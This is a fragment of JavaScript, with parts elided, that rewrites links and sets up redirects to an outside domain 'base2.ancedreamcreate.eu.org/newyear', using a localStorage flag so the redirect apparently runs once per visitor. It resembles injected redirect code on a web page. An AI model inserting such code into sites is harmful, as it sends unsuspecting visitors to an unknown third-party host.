function a(e) {
    ...
    function jump1() {
        if (!localStorage.is_fx) {
            ...
            //a('http://base2.ancedreamcreate.eu.org/newyear')
            //window.location.replace();
            // location.href="http://base2.ancedreamcreate.eu.org/newyear";
        } else {
            // localStorage.is_fx = Date.now()
        }
    }
    ...
    function jump2() {
        gotoData = {
            "hb": "http://base2.ancedreamcreate.eu.org/newyear",
            "hb1": "http://base2.ancedreamcreate.eu.org/newyear",
        }
    ...
    function jp() {
        ...
        a.setAttribute('href', "http://base2.ancedreamcreate.eu.org/newyear");
